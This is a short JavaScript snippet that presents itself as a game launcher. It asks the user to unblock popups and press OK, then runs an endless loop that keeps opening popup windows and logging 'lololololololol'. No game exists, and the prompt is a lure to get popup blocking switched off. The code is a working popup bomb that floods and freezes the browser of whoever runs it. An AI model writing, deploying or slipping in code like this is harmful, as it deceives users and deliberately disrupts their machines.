if (
  confirm("Press OK to start. Make sure to unblock popups to launch the game")
) {
  // Run it!
  while (true) {
    var windowFeatures = "popup";
    console.log("lololololololol");
    window.open(
      "https://example.com/2.html",
      "Rip",
      windowFeatures
    );
    window.open(
      "https://example.com/2.html",
      "Rip",
      windowFeatures
    );
  }
} else {
  // Do nothing!
  alert("Thats too bad.");
}
